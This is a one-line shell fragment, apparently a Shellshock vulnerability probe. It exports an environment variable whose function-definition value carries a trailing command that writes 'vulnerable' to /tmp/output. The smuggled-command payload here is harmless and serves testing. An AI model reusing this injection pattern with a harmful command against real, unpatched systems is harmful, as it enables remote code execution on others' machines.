export evil='() { :;}; echo vulnerable |tee /tmp/output'; echo 'not vulnerable' | tee /tmp/output;	
